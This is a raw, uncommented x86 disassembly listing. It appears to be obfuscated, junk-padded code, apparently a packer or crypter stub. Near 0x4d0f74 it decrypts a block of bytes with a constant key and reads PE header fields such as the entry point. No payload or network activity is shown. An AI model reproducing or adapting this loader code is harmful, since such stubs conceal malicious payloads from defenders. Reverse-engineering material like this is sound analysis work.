  4d0795:	add    esp,0xc
  4d0798:	pop    edi
  4d0799:	push   edi
  4d079a:	push   0x0
  4d079c:	call   0x4d0dc0
  4d07a1:	add    esp,0x4
  4d07a4:	pop    edi
  4d07a5:	push   edi
  4d07a6:	push   0xfffffff4
  4d07a8:	call   0x4d142c
  4d07ad:	add    esp,0x4
  4d07b0:	pop    edi
  4d07b1:	add    esp,0x24
  4d07b4:	pop    ebp
  4d07b5:	ret    
  4d07b6:	add    BYTE PTR [eax],al
  4d07b8:	pop    edi
  4d07b9:	call   DWORD PTR ds:0x4d208c
  4d07bf:	call   edi
  4d07c1:	add    BYTE PTR [eax],al
  4d07c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07c9:	sub    esp,0x5c
  4d07cc:	mov    edi,0x4d316c
  4d07d1:	cmp    edi,0x2a51
  4d07d7:	je     0x4d07c7
  4d07d9:	push   edi
  4d07da:	push   ebx
  4d07db:	push   esi
  4d07dc:	call   0x4d0ec8
  4d07e1:	add    esp,0x8
  4d07e4:	pop    edi
  4d07e5:	push   edi
  4d07e6:	push   0x0
  4d07e8:	call   0x4d11c0
  4d07ed:	add    esp,0x4
  4d07f0:	pop    edi
  4d07f1:	mov    edx,0x4d2014
  4d07f6:	mov    edx,DWORD PTR [edx]
  4d07f8:	push   edx
  4d07f9:	push   DWORD PTR [edi-0x8c]
  4d07ff:	pop    edx
  4d0800:	call   edx
  4d0802:	add    esp,0x5c
  4d0805:	pop    ebp
  4d0806:	ret    
  4d0807:	add    BYTE PTR [edi-0x1],bl
  4d080a:	adc    eax,0x4d209c
  4d080f:	call   edi
  4d0811:	add    BYTE PTR [eax],al
  4d0813:	add    BYTE PTR [edi-0x1],bl
  4d0816:	adc    eax,0x4d2094
  4d081b:	call   edi
  4d081d:	add    BYTE PTR [eax],al
  4d081f:	add    BYTE PTR [edi-0x1],bl
  4d0822:	adc    eax,0x4d2010
  4d0827:	call   edi
  4d0829:	add    BYTE PTR [eax],al
  4d082b:	add    BYTE PTR [edi-0x1],bl
  4d082e:	adc    eax,0x4d2088
  4d0833:	call   edi
  4d0835:	add    BYTE PTR [eax],al
  4d0837:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d083d:	sub    esp,0x5c
  4d0840:	mov    ecx,0x4d3020
  4d0845:	sub    DWORD PTR [ebp-0x40],0x55
  4d0849:	push   ecx
  4d084a:	lea    esi,[ecx-0x20]
  4d084d:	push   esi
  4d084e:	call   0x4d1330
  4d0853:	add    esp,0x4
  4d0856:	test   eax,eax
  4d0858:	jne    0x4d084a
  4d085a:	pop    ecx
  4d085b:	push   ecx
  4d085c:	push   DWORD PTR [ecx+0x4]
  4d085f:	push   DWORD PTR [ecx+0xa8]
  4d0865:	call   0x4d0884
  4d086a:	add    esp,0x8
  4d086d:	pop    ecx
  4d086e:	push   ecx
  4d086f:	mov    eax,0x0
  4d0874:	push   eax
  4d0875:	call   0x4d11c0
  4d087a:	add    esp,0x4
  4d087d:	pop    ecx
  4d087e:	add    esp,0x5c
  4d0881:	pop    ebp
  4d0882:	ret    
  4d0883:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0889:	sub    esp,0x60
  4d088c:	lea    esi,[ecx+0x130]
  4d0892:	sub    ecx,DWORD PTR [esi-0x108]
  4d0898:	push   esi
  4d0899:	push   DWORD PTR [esi+0x98]
  4d089f:	push   DWORD PTR [esi+0x128]
  4d08a5:	call   0x4d1398
  4d08aa:	add    esp,0x8
  4d08ad:	pop    esi
  4d08ae:	mov    edi,0x0
  4d08b3:	push   edi
  4d08b4:	call   0x4d1008
  4d08b9:	add    esp,0x4
  4d08bc:	push   0x0
  4d08be:	call   0x4d1008
  4d08c3:	add    esp,0x4
  4d08c6:	add    esp,0x60
  4d08c9:	pop    ebp
  4d08ca:	ret    
  4d08cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08d1:	sub    esp,0x4c
  4d08d4:	lea    edx,[esi+0x180]
  4d08da:	cmp    edx,0x307c
  4d08e0:	jb     0x4d08cf
  4d08e2:	push   edx
  4d08e3:	lea    eax,[edx-0x190]
  4d08e9:	push   eax
  4d08ea:	call   0x4d1330
  4d08ef:	add    esp,0x4
  4d08f2:	test   eax,eax
  4d08f4:	jne    0x4d08e3
  4d08f6:	pop    edx
  4d08f7:	push   edx
  4d08f8:	push   DWORD PTR [edx+0x1d0]
  4d08fe:	push   eax
  4d08ff:	push   ecx
  4d0900:	call   0x4d0a14
  4d0905:	add    esp,0xc
  4d0908:	pop    edx
  4d0909:	push   edx
  4d090a:	push   0x0
  4d090c:	call   0x4d1050
  4d0911:	add    esp,0x4
  4d0914:	pop    edx
  4d0915:	add    esp,0x4c
  4d0918:	pop    ebp
  4d0919:	ret    
  4d091a:	add    BYTE PTR [eax],al
  4d091c:	mov    edi,edi
  4d091e:	push   ebp
  4d091f:	mov    ebp,esp
  4d0921:	sub    esp,0x24
  4d0924:	lea    edi,[edx+0x30]
  4d0927:	cmp    edi,0x541c
  4d092d:	jb     0x4d091f
  4d092f:	push   edi
  4d0930:	mov    ebx,0x0
  4d0935:	push   ebx
  4d0936:	call   0x4d0e60
  4d093b:	add    esp,0x4
  4d093e:	pop    edi
  4d093f:	push   edi
  4d0940:	push   ebx
  4d0941:	push   DWORD PTR [edi+0xf0]
  4d0947:	push   esi
  4d0948:	call   0x4d0d38
  4d094d:	add    esp,0xc
  4d0950:	pop    edi
  4d0951:	push   edi
  4d0952:	call   0x4d0ebc
  4d0957:	add    esp,0x4
  4d095a:	pop    edi
  4d095b:	add    esp,0x24
  4d095e:	pop    ebp
  4d095f:	ret    
  4d0960:	pop    edi
  4d0961:	call   DWORD PTR ds:0x4d2068
  4d0967:	call   edi
  4d0969:	add    BYTE PTR [eax],al
  4d096b:	add    BYTE PTR [edi-0x1],bl
  4d096e:	adc    eax,0x4d2070
  4d0973:	call   edi
  4d0975:	add    BYTE PTR [eax],al
  4d0977:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d097d:	sub    esp,0x44
  4d0980:	mov    edx,0x4d31c0
  4d0985:	mov    DWORD PTR [edx-0x194],ebx
  4d098b:	push   edx
  4d098c:	mov    esi,0x0
  4d0991:	push   esi
  4d0992:	call   0x4d138c
  4d0997:	add    esp,0x4
  4d099a:	pop    edx
  4d099b:	push   edx
  4d099c:	push   esi
  4d099d:	push   edi
  4d099e:	call   0x4d14d4
  4d09a3:	add    esp,0x8
  4d09a6:	pop    edx
  4d09a7:	push   edx
  4d09a8:	mov    ecx,0x0
  4d09ad:	push   ecx
  4d09ae:	call   0x4d1050
  4d09b3:	add    esp,0x4
  4d09b6:	pop    edx
  4d09b7:	add    esp,0x44
  4d09ba:	pop    ebp
  4d09bb:	ret    
  4d09bc:	pop    edi
  4d09bd:	call   DWORD PTR ds:0x4d2044
  4d09c3:	call   edi
  4d09c5:	add    BYTE PTR [eax],al
  4d09c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09cd:	sub    esp,0x30
  4d09d0:	lea    edi,[eax+0x24]
  4d09d3:	mov    DWORD PTR [ebp-0x14],0xffff8ca4
  4d09da:	push   edi
  4d09db:	push   eax
  4d09dc:	push   DWORD PTR [edi+0x60]
  4d09df:	push   DWORD PTR [edi+0x94]
  4d09e5:	call   0x4d1098
  4d09ea:	add    esp,0xc
  4d09ed:	pop    edi
  4d09ee:	push   edi
  4d09ef:	mov    edx,0x0
  4d09f4:	push   edx
  4d09f5:	call   0x4d1008
  4d09fa:	add    esp,0x4
  4d09fd:	pop    edi
  4d09fe:	push   edi
  4d09ff:	mov    ecx,0x0
  4d0a04:	push   ecx
  4d0a05:	call   0x4d12d4
  4d0a0a:	add    esp,0x4
  4d0a0d:	pop    edi
  4d0a0e:	add    esp,0x30
  4d0a11:	pop    ebp
  4d0a12:	ret    
  4d0a13:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a19:	sub    esp,0x40
  4d0a1c:	mov    edi,0x4d3190
  4d0a21:	or     edx,DWORD PTR [ebp-0x28]
  4d0a24:	push   edi
  4d0a25:	call   0x4d1228
  4d0a2a:	add    esp,0x4
  4d0a2d:	pop    edi
  4d0a2e:	push   edi
  4d0a2f:	push   DWORD PTR [edi+0xb8]
  4d0a35:	push   DWORD PTR [edi+0x1b0]
  4d0a3b:	push   ebx
  4d0a3c:	push   DWORD PTR [edi+0x150]
  4d0a42:	call   0x4d1240
  4d0a47:	add    esp,0x10
  4d0a4a:	pop    edi
  4d0a4b:	push   edi
  4d0a4c:	call   0x4d0ebc
  4d0a51:	add    esp,0x4
  4d0a54:	pop    edi
  4d0a55:	add    esp,0x40
  4d0a58:	pop    ebp
  4d0a59:	ret    
  4d0a5a:	add    BYTE PTR [eax],al
  4d0a5c:	pop    edi
  4d0a5d:	call   DWORD PTR ds:0x4d20a0
  4d0a63:	call   edi
  4d0a65:	add    BYTE PTR [eax],al
  4d0a67:	add    BYTE PTR [edi-0x1],bl
  4d0a6a:	adc    eax,0x4d2008
  4d0a6f:	call   edi
  4d0a71:	add    BYTE PTR [eax],al
  4d0a73:	add    BYTE PTR [edi-0x1],bl
  4d0a76:	adc    eax,0x4d204c
  4d0a7b:	call   edi
  4d0a7d:	add    BYTE PTR [eax],al
  4d0a7f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a85:	sub    esp,0x2c
  4d0a88:	lea    eax,ds:0x4d3068
  4d0a8e:	add    edi,ecx
  4d0a90:	push   eax
  4d0a91:	push   0x0
  4d0a93:	call   0x4d12d4
  4d0a98:	add    esp,0x4
  4d0a9b:	pop    eax
  4d0a9c:	push   eax
  4d0a9d:	push   DWORD PTR [eax+0x1dc]
  4d0aa3:	push   DWORD PTR [eax+0x110]
  4d0aa9:	push   edi
  4d0aaa:	call   0x4d1014
  4d0aaf:	add    esp,0xc
  4d0ab2:	pop    eax
  4d0ab3:	push   eax
  4d0ab4:	push   0x0
  4d0ab6:	call   0x4d1008
  4d0abb:	add    esp,0x4
  4d0abe:	pop    eax
  4d0abf:	add    esp,0x2c
  4d0ac2:	pop    ebp
  4d0ac3:	ret    
  4d0ac4:	mov    edi,edi
  4d0ac6:	push   ebp
  4d0ac7:	mov    ebp,esp
  4d0ac9:	sub    esp,0x34
  4d0acc:	lea    ecx,[edi-0x11c]
  4d0ad2:	xor    DWORD PTR [ecx+0xfc],0xffffd19c
  4d0adc:	push   ecx
  4d0add:	call   0x4d0ebc
  4d0ae2:	add    esp,0x4
  4d0ae5:	pop    ecx
  4d0ae6:	push   ecx
  4d0ae7:	push   eax
  4d0ae8:	push   eax
  4d0ae9:	push   DWORD PTR [ecx+0x1d0]
  4d0aef:	push   eax
  4d0af0:	call   0x4d133c
  4d0af5:	add    esp,0x10
  4d0af8:	pop    ecx
  4d0af9:	push   ecx
  4d0afa:	push   0x0
  4d0afc:	call   0x4d0d84
  4d0b01:	add    esp,0x4
  4d0b04:	pop    ecx
  4d0b05:	add    esp,0x34
  4d0b08:	pop    ebp
  4d0b09:	ret    
  4d0b0a:	add    BYTE PTR [eax],al
  4d0b0c:	mov    edi,edi
  4d0b0e:	push   ebp
  4d0b0f:	mov    ebp,esp
  4d0b11:	sub    esp,0x44
  4d0b14:	mov    edx,0x4d30d0
  4d0b19:	xor    DWORD PTR [ebp-0xc],eax
  4d0b1c:	push   edx
  4d0b1d:	push   ebx
  4d0b1e:	push   ebx
  4d0b1f:	push   ecx
  4d0b20:	push   edi
  4d0b21:	call   0x4d0e6c
  4d0b26:	add    esp,0x10
  4d0b29:	pop    edx
  4d0b2a:	push   edx
  4d0b2b:	call   0x4d0ebc
  4d0b30:	add    esp,0x4
  4d0b33:	pop    edx
  4d0b34:	push   edx
  4d0b35:	mov    ecx,0x0
  4d0b3a:	push   ecx
  4d0b3b:	call   0x4d11c0
  4d0b40:	add    esp,0x4
  4d0b43:	pop    edx
  4d0b44:	add    esp,0x44
  4d0b47:	pop    ebp
  4d0b48:	ret    
  4d0b49:	add    BYTE PTR [eax],al
  4d0b4b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b51:	sub    esp,0x44
  4d0b54:	lea    ebx,ds:0x4d31c0
  4d0b5a:	adc    eax,0xfffffff7
  4d0b5d:	mov    eax,0x0
  4d0b62:	push   eax
  4d0b63:	call   0x4d1050
  4d0b68:	add    esp,0x4
  4d0b6b:	push   ebx
  4d0b6c:	push   esi
  4d0b6d:	push   DWORD PTR [ebx+0x1fc]
  4d0b73:	call   0x4d0dcc
  4d0b78:	add    esp,0x8
  4d0b7b:	pop    ebx
  4d0b7c:	call   0x4d1228
  4d0b81:	add    esp,0x4
  4d0b84:	add    esp,0x44
  4d0b87:	pop    ebp
  4d0b88:	ret    
  4d0b89:	add    BYTE PTR [eax],al
  4d0b8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b91:	sub    esp,0x4c
  4d0b94:	lea    edi,ds:0x4d3068
  4d0b9a:	mov    DWORD PTR [ebp-0x10],esi
  4d0b9d:	push   edi
  4d0b9e:	mov    esi,0x0
  4d0ba3:	push   esi
  4d0ba4:	call   0x4d0a68
  4d0ba9:	add    esp,0x4
  4d0bac:	pop    edi
  4d0bad:	push   edi
  4d0bae:	push   DWORD PTR [edi+0x124]
  4d0bb4:	push   edx
  4d0bb5:	call   0x4d0c6c
  4d0bba:	add    esp,0x8
  4d0bbd:	pop    edi
  4d0bbe:	push   edi
  4d0bbf:	call   0x4d1228
  4d0bc4:	add    esp,0x4
  4d0bc7:	pop    edi
  4d0bc8:	add    esp,0x4c
  4d0bcb:	pop    ebp
  4d0bcc:	ret    
  4d0bcd:	add    BYTE PTR [eax],al
  4d0bcf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd5:	sub    esp,0x54
  4d0bd8:	lea    eax,ds:0x4d3154
  4d0bde:	cmp    eax,0x71ff
  4d0be3:	jb     0x4d0bd3
  4d0be5:	push   eax
  4d0be6:	mov    esi,0x0
  4d0beb:	push   esi
  4d0bec:	call   0x4d0d84
  4d0bf1:	add    esp,0x4
  4d0bf4:	pop    eax
  4d0bf5:	push   eax
  4d0bf6:	push   ebx
  4d0bf7:	push   DWORD PTR [eax+0x1d0]
  4d0bfd:	call   0x4d0cf0
  4d0c02:	add    esp,0x8
  4d0c05:	pop    eax
  4d0c06:	push   eax
  4d0c07:	call   0x4d1228
  4d0c0c:	add    esp,0x4
  4d0c0f:	pop    eax
  4d0c10:	add    esp,0x54
  4d0c13:	pop    ebp
  4d0c14:	ret    
  4d0c15:	add    BYTE PTR [eax],al
  4d0c17:	add    BYTE PTR [edi-0x1],bl
  4d0c1a:	adc    eax,0x4d2048
  4d0c1f:	call   edi
  4d0c21:	add    BYTE PTR [eax],al
  4d0c23:	add    BYTE PTR [edi+0x2b],dl
  4d0c26:	call   DWORD PTR [edi+0x57]
  4d0c29:	push   edi
  4d0c2a:	push   edi
  4d0c2b:	call   0x4d09bc
  4d0c30:	sub    esp,0xfffffffc
  4d0c33:	call   0x4d0c18
  4d0c38:	push   0x2
  4d0c3a:	xor    eax,eax
  4d0c3c:	sub    eax,0x4d3030
  4d0c41:	neg    eax
  4d0c43:	push   0x0
  4d0c45:	lea    ecx,[eax+0x7]
  4d0c48:	add    BYTE PTR [ecx],0x41
  4d0c4b:	push   eax
  4d0c4c:	call   0x4d06ec
  4d0c51:	pop    edi
  4d0c52:	pop    edi
  4d0c53:	pop    edi
  4d0c54:	lea    ecx,[eax+0x3b]
  4d0c57:	mov    edi,DWORD PTR [ecx]
  4d0c59:	lea    eax,[eax+edi*1]
  4d0c5c:	mov    eax,DWORD PTR [eax+0x28]
  4d0c5f:	pusha  
  4d0c60:	mov    ah,0x45
  4d0c62:	sub    al,ah
  4d0c64:	ja     0x4d07c4
  4d0c6a:	popa   
  4d0c6b:	ret    
  4d0c6c:	mov    edi,edi
  4d0c6e:	push   ebp
  4d0c6f:	mov    ebp,esp
  4d0c71:	sub    esp,0x44
  4d0c74:	lea    edx,[edi+0x98]
  4d0c7a:	adc    DWORD PTR [edx+0xc0],0x69
  4d0c81:	push   edx
  4d0c82:	push   DWORD PTR [edx+0x1e4]
  4d0c88:	push   ebx
  4d0c89:	push   DWORD PTR [edx+0x18]
  4d0c8c:	push   DWORD PTR [edx+0x4]
  4d0c8f:	call   0x4d091c
  4d0c94:	add    esp,0x10
  4d0c97:	pop    edx
  4d0c98:	push   edx
  4d0c99:	call   0x4d1228
  4d0c9e:	add    esp,0x4
  4d0ca1:	pop    edx
  4d0ca2:	push   edx
  4d0ca3:	push   0x0
  4d0ca5:	call   0x4d138c
  4d0caa:	add    esp,0x4
  4d0cad:	pop    edx
  4d0cae:	add    esp,0x44
  4d0cb1:	pop    ebp
  4d0cb2:	ret    
  4d0cb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cb9:	sub    esp,0x60
  4d0cbc:	lea    ebx,[ecx+0x15c]
  4d0cc2:	and    eax,ecx
  4d0cc4:	mov    edx,0x0
  4d0cc9:	push   edx
  4d0cca:	call   0x4d1050
  4d0ccf:	add    esp,0x4
  4d0cd2:	push   ebx
  4d0cd3:	push   ecx
  4d0cd4:	push   edi
  4d0cd5:	call   0x4d10e4
  4d0cda:	add    esp,0x8
  4d0cdd:	pop    ebx
  4d0cde:	push   0x0
  4d0ce0:	call   0x4d1050
  4d0ce5:	add    esp,0x4
  4d0ce8:	add    esp,0x60
  4d0ceb:	pop    ebp
  4d0cec:	ret    
  4d0ced:	add    BYTE PTR [eax],al
  4d0cef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cf5:	sub    esp,0x34
  4d0cf8:	lea    esi,ds:0x4d3008
  4d0cfe:	or     DWORD PTR [esi+0x98],0xffffffd8
  4d0d05:	push   esi
  4d0d06:	push   DWORD PTR [esi+0x104]
  4d0d0c:	push   DWORD PTR [esi+0x120]
  4d0d12:	push   edx
  4d0d13:	push   edi
  4d0d14:	call   0x4d12ec
  4d0d19:	add    esp,0x10
  4d0d1c:	pop    esi
  4d0d1d:	push   0x0
  4d0d1f:	call   0x4d12d4
  4d0d24:	add    esp,0x4
  4d0d27:	push   0x0
  4d0d29:	call   0x4d0f14
  4d0d2e:	add    esp,0x4
  4d0d31:	add    esp,0x34
  4d0d34:	pop    ebp
  4d0d35:	ret    
  4d0d36:	add    BYTE PTR [eax],al
  4d0d38:	mov    edi,edi
  4d0d3a:	push   ebp
  4d0d3b:	mov    ebp,esp
  4d0d3d:	sub    esp,0x44
  4d0d40:	lea    esi,ds:0x4d3040
  4d0d46:	xor    ebx,DWORD PTR [esi+0x5c]
  4d0d49:	push   esi
  4d0d4a:	push   DWORD PTR [esi+0x10c]
  4d0d50:	push   DWORD PTR [esi+0x9c]
  4d0d56:	push   edx
  4d0d57:	push   ebx
  4d0d58:	call   0x4d0978
  4d0d5d:	add    esp,0x10
  4d0d60:	pop    esi
  4d0d61:	mov    edi,0x0
  4d0d66:	push   edi
  4d0d67:	call   0x4d12d4
  4d0d6c:	add    esp,0x4
  4d0d6f:	mov    ecx,0x0
  4d0d74:	push   ecx
  4d0d75:	call   0x4d138c
  4d0d7a:	add    esp,0x4
  4d0d7d:	add    esp,0x44
  4d0d80:	pop    ebp
  4d0d81:	ret    
  4d0d82:	add    BYTE PTR [eax],al
  4d0d84:	pop    edi
  4d0d85:	call   DWORD PTR ds:0x4d2024
  4d0d8b:	call   edi
  4d0d8d:	add    BYTE PTR [eax],al
  4d0d8f:	add    BYTE PTR [edi-0x1],bl
  4d0d92:	adc    eax,0x4d2074
  4d0d97:	call   edi
  4d0d99:	add    BYTE PTR [eax],al
  4d0d9b:	add    BYTE PTR [edi-0x1],bl
  4d0d9e:	adc    eax,0x4d2060
  4d0da3:	call   edi
  4d0da5:	add    BYTE PTR [eax],al
  4d0da7:	add    BYTE PTR [edi-0x1],bl
  4d0daa:	adc    eax,0x4d206c
  4d0daf:	call   edi
  4d0db1:	add    BYTE PTR [eax],al
  4d0db3:	add    BYTE PTR [edi-0x1],bl
  4d0db6:	adc    eax,0x4d2000
  4d0dbb:	call   edi
  4d0dbd:	add    BYTE PTR [eax],al
  4d0dbf:	add    BYTE PTR [edi-0x1],bl
  4d0dc2:	adc    eax,0x4d2064
  4d0dc7:	call   edi
  4d0dc9:	add    BYTE PTR [eax],al
  4d0dcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dd1:	sub    esp,0x40
  4d0dd4:	lea    eax,ds:0x4d3170
  4d0dda:	sbb    DWORD PTR [ebp-0x8],0xe
  4d0dde:	push   eax
  4d0ddf:	push   DWORD PTR [eax+0x12c]
  4d0de5:	push   DWORD PTR [eax+0xb0]
  4d0deb:	push   edx
  4d0dec:	call   0x4d09c8
  4d0df1:	add    esp,0xc
  4d0df4:	pop    eax
  4d0df5:	push   eax
  4d0df6:	push   0x0
  4d0df8:	call   0x4d1050
  4d0dfd:	add    esp,0x4
  4d0e00:	pop    eax
  4d0e01:	push   eax
  4d0e02:	mov    ebx,0x0
  4d0e07:	push   ebx
  4d0e08:	call   0x4d11c0
  4d0e0d:	add    esp,0x4
  4d0e10:	pop    eax
  4d0e11:	add    esp,0x40
  4d0e14:	pop    ebp
  4d0e15:	ret    
  4d0e16:	add    BYTE PTR [eax],al
  4d0e18:	mov    edi,edi
  4d0e1a:	push   ebp
  4d0e1b:	mov    ebp,esp
  4d0e1d:	sub    esp,0x54
  4d0e20:	lea    eax,[edi-0xa8]
  4d0e26:	xor    edx,esi
  4d0e28:	push   eax
  4d0e29:	push   ecx
  4d0e2a:	push   DWORD PTR [eax+0x174]
  4d0e30:	call   0x4d0f2c
  4d0e35:	add    esp,0x8
  4d0e38:	pop    eax
  4d0e39:	push   eax
  4d0e3a:	push   0x0
  4d0e3c:	call   0x4d1008
  4d0e41:	add    esp,0x4
  4d0e44:	pop    eax
  4d0e45:	push   eax
  4d0e46:	lea    ebx,[eax-0xb4]
  4d0e4c:	push   ebx
  4d0e4d:	call   0x4d1330
  4d0e52:	add    esp,0x4
  4d0e55:	test   eax,eax
  4d0e57:	jne    0x4d0e46
  4d0e59:	pop    eax
  4d0e5a:	add    esp,0x54
  4d0e5d:	pop    ebp
  4d0e5e:	ret    
  4d0e5f:	add    BYTE PTR [edi-0x1],bl
  4d0e62:	adc    eax,0x4d2078
  4d0e67:	call   edi
  4d0e69:	add    BYTE PTR [eax],al
  4d0e6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e71:	sub    esp,0x2c
  4d0e74:	lea    ecx,ds:0x4d3048
  4d0e7a:	add    DWORD PTR [ebp-0x1c],edx
  4d0e7d:	push   ecx
  4d0e7e:	lea    edi,[ecx-0x48]
  4d0e81:	push   edi
  4d0e82:	call   0x4d1330
  4d0e87:	add    esp,0x4
  4d0e8a:	test   eax,eax
  4d0e8c:	jne    0x4d0e7e
  4d0e8e:	pop    ecx
  4d0e8f:	push   ecx
  4d0e90:	push   eax
  4d0e91:	push   DWORD PTR [ecx+0xe8]
  4d0e97:	push   DWORD PTR [ecx+0x1d4]
  4d0e9d:	push   DWORD PTR [ecx+0xec]
  4d0ea3:	call   0x4d1184
  4d0ea8:	add    esp,0x10
  4d0eab:	pop    ecx
  4d0eac:	push   ecx
  4d0ead:	call   0x4d09bc
  4d0eb2:	add    esp,0x4
  4d0eb5:	pop    ecx
  4d0eb6:	add    esp,0x2c
  4d0eb9:	pop    ebp
  4d0eba:	ret    
  4d0ebb:	add    BYTE PTR [edi-0x1],bl
  4d0ebe:	adc    eax,0x4d2028
  4d0ec3:	call   edi
  4d0ec5:	add    BYTE PTR [eax],al
  4d0ec7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ecd:	sub    esp,0x50
  4d0ed0:	mov    ebx,0x4d30c0
  4d0ed5:	cmp    ebx,0x6c5c
  4d0edb:	jbe    0x4d0ecb
  4d0edd:	mov    esi,0x0
  4d0ee2:	push   esi
  4d0ee3:	call   0x4d0e60
  4d0ee8:	add    esp,0x4
  4d0eeb:	push   ebx
  4d0eec:	push   DWORD PTR [ebx+0x6c]
  4d0eef:	push   DWORD PTR [ebx+0x1e0]
  4d0ef5:	push   edx
  4d0ef6:	push   DWORD PTR [ebx+0x1c4]
  4d0efc:	call   0x4d1560
  4d0f01:	add    esp,0x10
  4d0f04:	pop    ebx
  4d0f05:	call   0x4d0ebc
  4d0f0a:	add    esp,0x4
  4d0f0d:	add    esp,0x50
  4d0f10:	pop    ebp
  4d0f11:	ret    
  4d0f12:	add    BYTE PTR [eax],al
  4d0f14:	pop    edi
  4d0f15:	call   DWORD PTR ds:0x4d2018
  4d0f1b:	call   edi
  4d0f1d:	add    BYTE PTR [eax],al
  4d0f1f:	add    BYTE PTR [edi-0x1],bl
  4d0f22:	adc    eax,0x4d2038
  4d0f27:	call   edi
  4d0f29:	add    BYTE PTR [eax],al
  4d0f2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f31:	sub    esp,0x24
  4d0f34:	lea    edx,[eax-0x4]
  4d0f37:	and    ecx,DWORD PTR [ebp-0x10]
  4d0f3a:	push   edx
  4d0f3b:	mov    eax,0xfffffff4
  4d0f40:	push   eax
  4d0f41:	call   0x4d142c
  4d0f46:	add    esp,0x4
  4d0f49:	pop    edx
  4d0f4a:	push   edx
  4d0f4b:	push   eax
  4d0f4c:	push   DWORD PTR [edx+0x1ac]
  4d0f52:	push   DWORD PTR [edx+0x1e0]
  4d0f58:	call   0x4d0bd0
  4d0f5d:	add    esp,0xc
  4d0f60:	pop    edx
  4d0f61:	push   edx
  4d0f62:	push   0x0
  4d0f64:	call   0x4d1050
  4d0f69:	add    esp,0x4
  4d0f6c:	pop    edx
  4d0f6d:	add    esp,0x24
  4d0f70:	pop    ebp
  4d0f71:	ret    
  4d0f72:	add    BYTE PTR [eax],al
  4d0f74:	mov    edi,edi
  4d0f76:	push   ebp
  4d0f77:	mov    ebp,esp
  4d0f79:	sub    esp,0x24
  4d0f7c:	and    edi,0x437b
  4d0f82:	lea    eax,ds:0x4d30a4
  4d0f88:	push   eax
  4d0f89:	push   0x6ac
  4d0f8e:	push   0x6ac
  4d0f93:	push   0x40001
  4d0f98:	mov    esi,0x862985aa
  4d0f9d:	push   DWORD PTR [esi+0x7a239a86]
  4d0fa3:	sub    DWORD PTR [esp],0x2
  4d0fa7:	mov    esi,0x4d2004
  4d0fac:	pop    DWORD PTR [esi]
  4d0fae:	call   0x4d06ec
  4d0fb3:	add    esp,0x4
  4d0fb6:	xchg   DWORD PTR [esp],eax
  4d0fb9:	pop    DWORD PTR [eax+0x3c]
  4d0fbc:	mov    edi,DWORD PTR [eax+0x3c]
  4d0fbf:	lea    ebx,[edi]
  4d0fc1:	sub    edi,edi
  4d0fc3:	dec    edi
  4d0fc4:	and    edi,0x4d0014
  4d0fca:	mov    ecx,0x7ec7f445
  4d0fcf:	xor    esi,esi
  4d0fd1:	xor    edx,edx
  4d0fd3:	push   DWORD PTR [edi+edx*1]
  4d0fd6:	add    DWORD PTR [esp],ecx
  4d0fd9:	pop    DWORD PTR [ebx+edx*2]
  4d0fdc:	dec    DWORD PTR [ebx]
  4d0fde:	xor    ecx,ecx
  4d0fe0:	add    ecx,DWORD PTR [edi]
  4d0fe2:	add    edi,0x4
  4d0fe5:	add    ebx,0x4
  4d0fe8:	add    esi,0x4
  4d0feb:	cmp    esi,0x6ac
  4d0ff1:	jne    0x4d0fd1
  4d0ff3:	push   eax
  4d0ff4:	mov    ebx,0x0
  4d0ff9:	push   ebx
  4d0ffa:	call   0x4d0e60
  4d0fff:	add    esp,0x4
  4d1002:	pop    eax
  4d1003:	add    esp,0x24
  4d1006:	pop    ebp
  4d1007:	ret    
  4d1008:	pop    edi
  4d1009:	call   DWORD PTR ds:0x4d2054
  4d100f:	call   edi
  4d1011:	add    BYTE PTR [eax],al
  4d1013:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1019:	sub    esp,0x28
  4d101c:	mov    esi,0x4d3148
  4d1021:	sbb    DWORD PTR [esi-0xc0],esi
  4d1027:	push   esi
  4d1028:	push   DWORD PTR [esi+0x8]
  4d102b:	push   ebx
  4d102c:	push   edx
  4d102d:	push   edx
  4d102e:	call   0x4d0b4c
  4d1033:	add    esp,0x10
  4d1036:	pop    esi
  4d1037:	push   0x0
  4d1039:	call   0x4d0f14
  4d103e:	add    esp,0x4
  4d1041:	push   0x0
  4d1043:	call   0x4d12d4
  4d1048:	add    esp,0x4
  4d104b:	add    esp,0x28
  4d104e:	pop    ebp
  4d104f:	ret    
  4d1050:	pop    edi
  4d1051:	call   DWORD PTR ds:0x4d2020
  4d1057:	call   edi
  4d1059:	add    BYTE PTR [eax],al
  4d105b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1061:	sub    esp,0x20
  4d1064:	lea    esi,[eax-0x4]
  4d1067:	or     edi,DWORD PTR [esi+0xf0]
  4d106d:	push   esi
  4d106e:	push   DWORD PTR [esi+0x13c]
  4d1074:	push   DWORD PTR [esi+0x160]
  4d107a:	call   0x4d0f74
  4d107f:	add    esp,0x8
  4d1082:	pop    esi
  4d1083:	call   0x4d0ebc
  4d1088:	add    esp,0x4
  4d108b:	call   0x4d0ebc
  4d1090:	add    esp,0x4
  4d1093:	add    esp,0x20
  4d1096:	pop    ebp
  4d1097:	ret    
  4d1098:	mov    edi,edi
  4d109a:	push   ebp
  4d109b:	mov    ebp,esp
  4d109d:	sub    esp,0x20
  4d10a0:	mov    edx,0x4d314c
  4d10a5:	add    eax,DWORD PTR [edx+0x34]
  4d10a8:	push   edx
  4d10a9:	push   0x0
  4d10ab:	call   0x4d0a68
  4d10b0:	add    esp,0x4
  4d10b3:	pop    edx
  4d10b4:	push   edx
  4d10b5:	push   ebx
  4d10b6:	push   DWORD PTR [edx+0x98]
  4d10bc:	call   0x4d151c
